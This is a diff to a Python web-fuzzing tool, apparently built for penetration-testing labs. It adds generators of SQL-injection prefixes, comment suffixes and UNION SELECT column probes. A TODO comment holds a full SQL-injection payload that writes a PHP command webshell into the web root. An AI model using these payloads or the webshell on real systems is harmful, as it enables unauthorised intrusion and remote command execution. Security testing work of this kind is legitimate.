@@ -19,6 +19,8 @@ from .wordlists import wordlist_strip_prefix
 # TODO: Known path should not start with slash and should end with one (if it is a dir)
 # TODO: Figure out how to recommend PHP Inclusion (LFI), SSTI or XSS based on reflection analysis
 
+# TODO: SQL webshell mode - e.g. ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+#           - Test on e.g. SQL Injections Attacks - Module Exercise - VM #2 
 # TODO: PHP filters (php://filter/... and data://...)
 # TODO: Remote file inclusion? Test if we can establish a connection to a file hosted on a local webserver (run a simple web server). Or does this go in the PHP Inclusion, SSTI, and XSS category?
 
@@ -30,6 +32,26 @@ def relpath_windows(args):
 
 def relpath(args):
     return relpath_linux(args) + relpath_windows(args)
+
+def sqli_prefix(args):
+    return [
+        b"",
+        b"' ", b"%' ", b"') ", b"')) ", b"%') ", b"%')) ",
+        b'" ', b'%" ', b'") ', b'")) ', b'%") ', b'%")) '
+    ]
+
+def sqli_suffix(args):
+    return [
+        b"", b"-- ", b"--- ", b"# ", b"// ", b"-- // ", b"--- // ", b"# // "
+    ]
+
+def sqli_union(args):
+    all_cols = [chr(97 + i).encode() for i in range(16)]
+    
+    for i in range(1, len(all_cols)):
+        cols = all_cols[:i]
+        yield b"UNION SELECT '" + b"', '".join(cols) + b"'"
+        yield b'UNION SELECT "' + b'", "'.join(cols) + b'"'
 
 FUZZ_TYPES = {
     "command-injection": FuzzType(params = [
@@ -83,9 +105,17 @@ FUZZ_TYPES = {
         ]),
     ], encoders=[url_encoder], required_args=["known_path"]),
 
-    "sqli": FuzzType(params = [
+    "sqli-identify": FuzzType(params = [
         FuzzParameter(name="FUZZ", wordlists=[
             "/usr/share/wordlists/wfuzz/Injections/SQL.txt"
+        ]),
+    ], encoders=[url_encoder], required_args=[]),
+
+    "sqli-union": FuzzType(params = [
+        FuzzParameter(name="FUZZ", wordlists=[
+            sqli_prefix,
+            sqli_union,
+            sqli_suffix,
         ]),
     ], encoders=[url_encoder], required_args=[]),
 
